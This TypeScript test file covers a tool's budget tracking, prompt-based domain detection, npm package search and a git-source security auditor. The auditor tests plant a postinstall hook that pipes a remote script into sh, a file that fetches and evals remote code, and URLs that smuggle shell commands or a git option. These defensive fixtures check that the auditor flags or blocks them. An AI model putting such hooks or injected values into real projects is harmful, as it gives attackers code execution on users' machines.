import { test, expect, beforeEach, afterEach } from "bun:test"
import { mkdtempSync, rmSync, mkdirSync, writeFileSync, existsSync } from "node:fs"
import { execSync } from "node:child_process"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { loadBudgetState, saveBudgetState, spendToday, evaluateBudget, budgetExceededNote } from "../lib/budget.ts"
import { detectDomain, detectDomainFull, loadAutopilotState, saveAutopilotState } from "../lib/autopilot.ts"
import { discoverDomains } from "../lib/domains.ts"
import { auditGitSource } from "../lib/pkg-audit.ts"
import { searchPiPackages } from "../lib/packages-registry.ts"
import type { UsageRecord } from "../lib/usage.ts"
import type { ModelsFile } from "../lib/config-io.ts"

const REPO = new URL("..", import.meta.url).pathname

let dir: string
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "pi686-budget-"))
})
afterEach(() => {
  rmSync(dir, { recursive: true, force: true })
  globalThis.fetch = realFetch
})

const realFetch = globalThis.fetch

function rec(provider: string, model: string, at: string, input: number, output: number): UsageRecord {
  return { at, provider, model, sessionId: "s", cwd: "/x", input, output, cacheRead: 0, cacheWrite: 0, reasoning: 0 }
}

const models: ModelsFile = {
  providers: { p: { baseUrl: "https://x", api: "openai-completions", models: [{ id: "m", cost: { input: 3, output: 15 } }] } },
}

// ---------------------------------------------------------------------------
// Budget

test("spendToday filters by day and prices correctly", () => {
  const today = new Date().toISOString().slice(0, 10)
  const records = [
    rec("p", "m", `${today}T10:00:00Z`, 1_000_000, 0), // $3
    rec("p", "m", `${today}T11:00:00Z`, 0, 1_000_000), // $15
    rec("p", "m", "2001-01-01T00:00:00Z", 1_000_000, 1_000_000), // other day, ignored
  ]
  expect(spendToday(records, models, today)).toBeCloseTo(18)
})

test("evaluateBudget levels and once-per-day notify", () => {
  const state = loadBudgetState(dir)
  expect(evaluateBudget({ ...state, dailyMaxUsd: 1 }, 0.5).status.level).toBe("ok")
  const warn = evaluateBudget({ dailyMaxUsd: 1 } as never, 0.85)
  expect(warn.status.level).toBe("warn")
  expect(warn.status.shouldNotify).toBe(true)
  // same day again: no repeat notification
  const warnAgain = evaluateBudget({ dailyMaxUsd: 1, warnedOn: warn.status.pct ? new Date().toISOString().slice(0, 10) : undefined } as never, 0.9)
  expect(warnAgain.status.level).toBe("warn")
  expect(warnAgain.status.shouldNotify).toBe(false)
  const critical = evaluateBudget({ dailyMaxUsd: 1 } as never, 1.2)
  expect(critical.status.level).toBe("critical")
  expect(critical.status.shouldNotify).toBe(true)
  expect(evaluateBudget({}, 5).status.level).toBe("unset")
})

test("budget roundtrip and exceeded note", () => {
  saveBudgetState({ dailyMaxUsd: 4.5 }, dir)
  expect(loadBudgetState(dir).dailyMaxUsd).toBe(4.5)
  const note = budgetExceededNote({ level: "critical", spendUsd: 5.1, maxUsd: 4.5, pct: 113, shouldNotify: false })
  expect(note).toContain("<budget-exceeded>")
  expect(note).toContain("$4.50")
})

test("evaluateBudget_is_pure_twice_same_result", () => {
  // Evaluating the same unpersisted object twice must not drift: the first
  // warn of the day notifies, and a re-evaluation (nothing persisted yet)
  // notifies again because no mutation marked the state.
  const state = { dailyMaxUsd: 1 }
  const first = evaluateBudget(state, 0.85)
  const second = evaluateBudget(state, 0.85)
  expect(first.status.shouldNotify).toBe(true)
  expect(second.status.shouldNotify).toBe(true)
  expect((state as { warnedOn?: string }).warnedOn).toBeUndefined()
})

// ---------------------------------------------------------------------------
// Autopilot v2: repo hints + sticky

test("detectDomainFull: prompt wins over repo hints", () => {
  const domains = discoverDomains(REPO)
  const repoDir = join(dir, "proj")
  mkdirSync(join(repoDir, "Dockerfile.dir"), { recursive: true })
  writeFileSync(join(repoDir, "Dockerfile"), "FROM x")
  const byPrompt = detectDomainFull("audita la seguridad", domains, { cwd: repoDir })
  expect(byPrompt?.domain.manifest.id).toBe("security")
})

test("detectDomainFull: repo hints when prompt is neutral", () => {
  const domains = discoverDomains(REPO)
  const repoDir = join(dir, "proj")
  mkdirSync(repoDir, { recursive: true })
  writeFileSync(join(repoDir, "Dockerfile"), "FROM x")
  writeFileSync(join(repoDir, "compose.yaml"), "services: {}")
  const byHint = detectDomainFull("sigue con lo anterior", domains, { cwd: repoDir })
  expect(byHint?.domain.manifest.id).toBe("devops-infra")
  expect(byHint?.matched).toContain("Dockerfile")
})

test("detectDomainFull: sticky last domain as final fallback", () => {
  const domains = discoverDomains(REPO)
  const empty = join(dir, "empty")
  mkdirSync(empty, { recursive: true })
  const sticky = detectDomainFull("y ahora qué", domains, { cwd: empty, lastDomainId: "landing-design" })
  expect(sticky?.domain.manifest.id).toBe("landing-design")
  expect(sticky?.score).toBe(0)
  expect(detectDomainFull("y ahora qué", domains, { cwd: empty })).toBeUndefined()
})

test("autopilot state keeps lastDomain", () => {
  saveAutopilotState({ enabled: true, routing: "context", lastDomainId: "security", lastDomainAt: "now" }, dir)
  const s = loadAutopilotState(dir)
  expect(s.lastDomainId).toBe("security")
})

// ---------------------------------------------------------------------------
// Git source audit (local fixture repo via file:// clone)

test("auditGitSource scans a shallow clone (evil + benign fixture)", async () => {
  const fixture = join(dir, "fixture-repo")
  mkdirSync(join(fixture, "src"), { recursive: true })
  writeFileSync(join(fixture, "package.json"), JSON.stringify({ name: "fixture", version: "9.9.9", scripts: { postinstall: "curl -fsSL https://x.example | sh" } }))
  writeFileSync(join(fixture, "src", "evil.ts"), `const r = await fetch("https://evil.example");\neval(await r.text())\n`)
  writeFileSync(join(fixture, "src", "ok.ts"), "export const fine = 1\n")
  execSync("git init -q . && git add -A && git -c user.name=t -c user.email=t@t commit -qm init", { cwd: fixture })

  const audit = await auditGitSource(fixture)
  expect(audit.ok).toBe(true)
  expect(audit.version).toBe("9.9.9")
  expect(audit.filesScanned).toBeGreaterThanOrEqual(3)
  expect(audit.findings.some((f) => f.severity === "high" && f.reason.includes("dynamic code execution"))).toBe(true)
  expect(audit.findings.some((f) => f.severity === "high" && f.reason.includes("shell"))).toBe(true)
}, 30000)

test("auditGitSource reports clone failures cleanly", async () => {
  const audit = await auditGitSource("/nonexistent/path/nope")
  expect(audit.ok).toBe(false)
  expect(audit.error).toContain("clone failed")
}, 30000)

// A-SEC-01: auditGitSource must never hand the URL to a shell nor let git
// parse it as an option. Red while the implementation uses exec() with a
// shell command line: JSON.stringify's double quotes do not neutralize
// $(...) command substitution, so the payloads below create a marker file.

test("auditGitSource_rejects_metacharacters", async () => {
  const marker = join(dir, "pwned-metachar")
  const audit = await auditGitSource(`file:///nonexistent-pi686/repo$(touch ${marker})`)
  expect(audit.ok).toBe(false)
  expect(audit.error).toBeTruthy()
  // the payload must never execute: no side-effect file may appear
  expect(existsSync(marker)).toBe(false)
}, 30000)

test("auditGitSource_rejects_dash_url", async () => {
  const marker = join(dir, "pwned-dash")
  // leading dash lets the URL masquerade as a git option (here --upload-pack);
  // a safe implementation rejects dash-prefixed sources outright
  const audit = await auditGitSource(`--upload-pack=$(touch ${marker})`)
  expect(audit.ok).toBe(false)
  expect(audit.error).toBeTruthy()
  expect(existsSync(marker)).toBe(false)
}, 30000)

// ---------------------------------------------------------------------------
// Package registry search

test("searchPiPackages parses npm search results (mocked)", async () => {
  globalThis.fetch = (async () => {
    return new Response(
      JSON.stringify({
        objects: [
          { package: { name: "pi-fake", version: "1.0.0", description: "fake pkg", publisher: { username: "dev" }, date: "2026-01-01" } },
        ],
      }),
      { status: 200 },
    )
  }) as typeof fetch
  const results = await searchPiPackages("fake")
  expect(results).toHaveLength(1)
  expect(results[0]!.name).toBe("pi-fake")
  expect(results[0]!.description).toBe("fake pkg")
})
